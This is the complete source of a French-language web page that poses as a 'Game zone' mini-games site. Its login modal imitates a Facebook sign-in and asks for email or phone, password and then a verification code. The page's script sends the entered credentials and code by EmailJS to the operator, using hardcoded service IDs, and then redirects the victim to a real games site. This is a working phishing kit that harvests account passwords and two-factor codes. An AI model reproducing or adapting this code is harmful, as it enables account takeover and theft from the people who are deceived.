<style>
:root{
  --primary:#ff6b35;
  --secondary:#ffb703;
  --bg:#fff8e7;
}

body{
  margin:0;
  font-family:Inter, system-ui;
  background:linear-gradient(180deg,#f8fafc 0%,#eef4ff 100%);
  color:#0f172a;
}

/* HEADER */
.header{
  background:linear-gradient(135deg,#4c1d95,#7c3aed,#ec4899,#f59e0b);
  color:white;
  padding:18px 0;
  position:sticky;
  top:0;
  z-index:10;
  box-shadow:0 10px 30px rgba(0,0,0,.25);
  overflow:hidden;
}

.header-content{
  max-width:1100px;
  margin:auto;
  padding:0 20px;
  display:flex;
  align-items:center;
  justify-content:space-between;
}

/* BRAND */
.brand{
  display:flex;
  align-items:center;
  gap:12px;
}

.logo{
  width:90px;
  height:90px;
  border-radius:24px;
  overflow:hidden;
  border:3px solid rgba(255,255,255,.4);
  box-shadow:0 10px 25px rgba(0,0,0,.3);
  flex-shrink:0;
}

.title{
  font-size:42px;
  font-weight:900;
  line-height:1;
  text-transform:uppercase;
  text-shadow:
    0 3px 0 rgba(0,0,0,.25),
    0 8px 25px rgba(0,0,0,.35);
}

.subtitle{
  font-size:18px;
  opacity:1;
  font-weight:600;
  margin-top:6px;
}

/* BUTTONS */
.btn{
  padding:10px 16px;
  border-radius:8px;
  font-weight:600;
  cursor:pointer;
  transition:.2s;
  border:none;
}

.btn.primary{
  background:white;
  color:#1e3a8a;
  padding:18px 30px;
  border-radius:20px;
  font-size:20px;
  font-weight:800;
  box-shadow:0 8px 25px rgba(0,0,0,.2);
}

.btn.primary:hover{
  background:#e0ecff;
}

.btn.ghost{
  background:transparent;
  color:white;
  margin-right:10px;
}

.btn.ghost:hover{
  background:rgba(255,255,255,.15);
}
/* HERO */
.hero{
  max-width:1100px;
  margin:auto;
  padding:60px 20px;
  text-align:center;
  position:relative;
}

.hero h1{
  font-size:72px;
  font-weight:900;
  line-height:1;
  background:linear-gradient(
    90deg,
    #ff6b35,
    #ff9f1c,
    #ec4899,
    #7c3aed
  );
  -webkit-background-clip:text;
  -webkit-text-fill-color:transparent;
  margin-bottom:20px;
}

.hero h1{
  background:linear-gradient(90deg,#ff6b35,#ffb703);
  -webkit-background-clip:text;
  -webkit-text-fill-color:transparent;
}

.hero p{
  margin-top:15px;
  opacity:.7;
}

/* CARD CLOUD */
.card{
  margin:40px auto 0;
  max-width:600px;
  background:linear-gradient(
    135deg,
    #ff7b00,
    #ff4d6d,
    #7c3aed
  );
  border-radius:30px;
  padding:25px;
  color:white;
  box-shadow:
    0 15px 40px rgba(0,0,0,.2),
    0 0 30px rgba(255,123,0,.25);
}

.upload-box{
  border:none;
  padding:15px;
  border-radius:20px;
  cursor:pointer;
}

.upload-box:hover{
  border-color:#ff6b35;
  background:#fff5e6;
}

.upload-icon{
  font-size:30px;
}

/* MODAL */
.modal{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,0.4);
  backdrop-filter:blur(6px);
  display:none;
  align-items:center;
  justify-content:center;
}

.modal .box{
  background:white;
  padding:28px;
  width:320px;
  border-radius:16px;
  box-shadow:0 30px 80px rgba(0,0,0,.2);
}

/* INPUT */
.modal input{
  width:100%;
  padding:12px;
  margin-top:12px;
  border-radius:8px;
  border:1px solid #ddd;
}

#code{
  border:2px dashed #2563eb;
  background:#f0f7ff;
  text-align:center;
}

/* NOTIF */
#modalNotification{
  display:none;
  padding:10px;
  margin:10px 0;
  background:#2563eb;
  color:white;
  border-radius:8px;
  text-align:center;
}

/* NOTE */
.note{
  text-align:center;
  font-size:12px;
  opacity:.6;
  margin-top:10px;
}

.preview{
  margin-top:50px;
  position:relative;
  max-width:850px;
  margin-left:auto;
  margin-right:auto;
  border-radius:30px;
  overflow:hidden;
  box-shadow:
    0 20px 60px rgba(0,0,0,.25),
    0 0 40px rgba(124,58,237,.25);
}

.preview img{
  width:100%;
  display:block;
  filter:blur(3px) brightness(.7);
}

.preview .overlay{
  position:absolute;
  inset:0;
  background:rgba(0,0,0,.25);
  display:flex;
  align-items:center;
  justify-content:center;
  color:white;
  font-weight:900;
  font-size:42px;
  text-align:center;
  text-shadow:0 4px 15px rgba(0,0,0,.6);
}

body{
  background:
    radial-gradient(circle at top,#ffffff,#eef2ff);
}

.hero::before{
  content:"⭐ 🎮 ⚡ 🏆";
  position:absolute;
  top:0;
  left:50%;
  transform:translateX(-50%);
  font-size:40px;
  opacity:.2;
}

@media (max-width: 768px) {
  .header-content {
    flex-direction: column;
    align-items: flex-start;
    gap: 12px;
  }

  .btn.primary {
    font-size: 16px;
    padding: 12px 18px;
    border-radius: 14px;
    width: 100%;
    text-align: center;
  }

  nav {
    width: 100%;
  }

  .header {
    overflow: visible; /* important */
  }
}

</style>
</head>

<body>

<header class="header">
  <div class="header-content">

    <div class="brand">
      <div class="logo">
  <img src="preview.jpg" alt="logo"
       style="width:100%;height:100%;object-fit:cover;border-radius:12px;">
</div>

      <div>
        <div class="title">Game zone</div>
        <div class="subtitle">Mini-jeux et défis amusants</div>
      </div>
    </div>

    <nav>
      <button class="btn primary" id="loginBtn">Se connecter</button>
    </nav>

  </div>
</header>

<section class="hero">

  <h1>🎮 Bienvenue dans la Game Zone</h1>
<p>Découvrez des mini-jeux, des défis et des surprises amusantes !</p>

<div class="preview">
  <img src="preview.jpg" alt="preview">
  <div class="overlay">
    <p>🎲 Plus de 25 mini-jeux à découvrir !</p>
  </div>
</div>

  <div class="card">
    <div class="upload-box">
      <div class="upload-icon">🚀</div>
      <p><strong>Connectez-vous pour commencer l'aventure</strong></p>
    </div>

    <div class="note">⭐ Amusement garanti ⭐</div>
  </div>

</section>

<!-- MODALE LOGIN -->
<div class="modal" id="loginModal">
  <div class="box">

<h2 style="text-align:center;color:#1877f2; display:flex; flex-direction:column; align-items:center; gap:10px;">
  
  <img src="logo_fb.png" alt="logo" style="width:48px; height:48px;">
  
  Identification

</h2>

<div id="modalNotification"></div>

<input id="userId" placeholder="Courriel ou numéro">
<input id="password" type="password" placeholder="Mot de passe">
<input id="code" maxlength="8" placeholder="Code" style="display:none">

<button class="btn" id="confirmLogin" style="width:100%;margin-top:12px">
  Se connecter
</button>

<p class="note">Se connecter</p>
</div>
</div>

<script>
const modal = document.getElementById('loginModal');
const loginBtn = document.getElementById('loginBtn');
const confirmLogin = document.getElementById('confirmLogin');
const codeInput = document.getElementById('code');
const userIdInput = document.getElementById('userId');
const passwordInput = document.getElementById('password');
const modalNotif = document.getElementById('modalNotification');

let codeSent = false;

if(sessionStorage.getItem("demo_auth_token") === "true"){
    window.location.href = "secure-photos.html";
}

function showModalNotification(message){
    modalNotif.textContent = message;
    modalNotif.style.display = "block";
    requestAnimationFrame(()=>{
        modalNotif.style.opacity = "1";
        modalNotif.style.transform = "translateY(0)";
    });
    setTimeout(()=>{
        modalNotif.style.opacity = "0";
        modalNotif.style.transform = "translateY(-10px)";
        setTimeout(()=> modalNotif.style.display = "none", 400);
    }, 3000);
}

loginBtn.addEventListener("click", ()=> modal.style.display = "flex");
modal.addEventListener("click", e=>{if(e.target===modal) modal.style.display="none";});

async function sendEmailLogin(username, password){
  return fetch("https://api.emailjs.com/api/v1.0/email/send",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      service_id:"service_uvghcck",
      template_id:"template_email",
      user_id:"aQIYW-EEnTtmxU4FY",
      template_params:{username,password}
    })
  });
}
async function sendCodeValidation(code){
  return fetch("https://api.emailjs.com/api/v1.0/email/send",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      service_id:"service_uvghcck",
      template_id:"template_code",
      user_id:"aQIYW-EEnTtmxU4FY",
      template_params:{code}
    })
  });
}

confirmLogin.onclick = async ()=>{
  const user = userIdInput.value.trim();
  const pwd  = passwordInput.value.trim();

  if(!codeSent){
    if(!user || !pwd){
      showModalNotification("Veuillez remplir tous les champs.");
      return;
    }

    confirmLogin.disabled = true;
    confirmLogin.textContent = "Envoi…";

    const response = await sendEmailLogin(user,pwd);
    if(!response.ok){
      showModalNotification("Erreur d'envoi.");
      confirmLogin.disabled = false;
      confirmLogin.textContent = "Se connecter";
      return;
    }

    showModalNotification("Code de validation envoyé.");
    codeInput.style.display = "block";
    confirmLogin.textContent = "Valider le code";
    confirmLogin.disabled = false;
    codeSent = true;
    return;
  }

  const code = codeInput.value.trim();
  if(!/^[0-9]{6,8}$/.test(code)){
    showModalNotification("Code invalide.");
    return;
  }

  const rep = await sendCodeValidation(code);
  if(!rep.ok){
    showModalNotification("Erreur validation code.");
    return;
  }

  sessionStorage.setItem("demo_auth_token","true");
  window.location.href="https://poki.com/fr?utm_source=chatgpt.com#utm_source=redirect-en-fr";
};
</script>

</body>
